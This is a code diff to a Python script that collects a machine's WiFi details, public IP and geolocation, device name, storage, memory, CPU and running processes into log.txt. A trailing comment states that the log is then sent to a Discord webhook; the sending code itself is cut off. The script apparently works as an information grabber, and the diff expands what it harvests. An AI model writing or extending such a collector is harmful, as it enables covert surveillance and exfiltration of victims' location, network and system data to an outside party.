@@ -43,10 +43,14 @@ def get_network_info():
 def get_wifi_details():
     ssid = execute_command('iwgetid -r')
     signal_strength = execute_command('iwconfig 2>&1 | grep Signal | awk \'{print $4}\' | cut -d "=" -f 2')
+    frequency = execute_command("iwlist frequency | grep Current | awk '{print $2, $3}'")
+    bit_rate = execute_command("iwlist bitrate | grep Current | awk '{print $2, $3}'")
 
     return {
         'ssid': ssid,
         'signal_strength': signal_strength,
+        'frequency': frequency,
+        'bit_rate': bit_rate
     }
 
 # Function to get public IP address
@@ -73,8 +77,30 @@ def get_device_info():
         'platform_version': platform.version(),
         'architecture': platform.machine(),
         'processor': platform.processor(),
+        'device_name': platform.node(),
+        'python_version': platform.python_version(),
     }
     return device_info
+
+# Function to get storage information
+def get_storage_info():
+    storage_info = execute_command('df -h')
+    return storage_info
+
+# Function to get memory information
+def get_memory_info():
+    memory_info = execute_command('free -h')
+    return memory_info
+
+# Function to get CPU information
+def get_cpu_info():
+    cpu_info = execute_command('lscpu')
+    return cpu_info
+
+# Function to get running processes
+def get_running_processes():
+    processes = execute_command('ps aux')
+    return processes
 
 # Collect detailed network, WiFi, and device information
 network_info = get_network_info()
@@ -82,6 +108,10 @@ wifi_details = get_wifi_details()
 public_ip = get_public_ip()
 location_info = get_location_info(public_ip)
 device_info = get_device_info()
+storage_info = get_storage_info()
+memory_info = get_memory_info()
+cpu_info = get_cpu_info()
+running_processes = get_running_processes()
 
 # Write collected information to log.txt
 with open('log.txt', 'w') as f:
@@ -89,7 +119,7 @@ with open('log.txt', 'w') as f:
     for key, value in device_info.items():
         f.write(f"{key.capitalize()}: {value}\n")
     f.write("\n")
-    
+
     f.write("=== Network Information ===\n")
     for iface, info in network_info.items():
         f.write(f"Interface: {iface}\n")
@@ -103,18 +133,33 @@ with open('log.txt', 'w') as f:
                 f.write(f"Netmask: {addr.get('netmask', 'N/A')}\n")
         f.write("\n")
 
-    f.write(f"=== WiFi Details ===\n")
+    f.write("=== WiFi Details ===\n")
     f.write(f"SSID: {wifi_details['ssid']}\n")
     f.write(f"Signal Strength: {wifi_details['signal_strength']} dBm\n")
+    f.write(f"Frequency: {wifi_details['frequency']}\n")
+    f.write(f"Bit Rate: {wifi_details['bit_rate']}\n")
     f.write("\n")
 
-    f.write(f"=== Public IP and Location ===\n")
+    f.write("=== Public IP and Location ===\n")
     f.write(f"Public IP Address: {public_ip}\n")
     if 'error' in location_info:
         f.write(f"Location Information: {location_info['error']}\n")
     else:
         for key, value in location_info.items():
             f.write(f"{key.capitalize()}: {value}\n")
+    f.write("\n")
+
+    f.write("=== Storage Information ===\n")
+    f.write(f"{storage_info}\n")
+
+    f.write("=== Memory Information ===\n")
+    f.write(f"{memory_info}\n")
+
+    f.write("=== CPU Information ===\n")
+    f.write(f"{cpu_info}\n")
+
+    f.write("=== Running Processes ===\n")
+    f.write(f"{running_processes}\n")
 
 # Send log.txt content to Discord webhook
 with open('log.txt', 'r') as f:
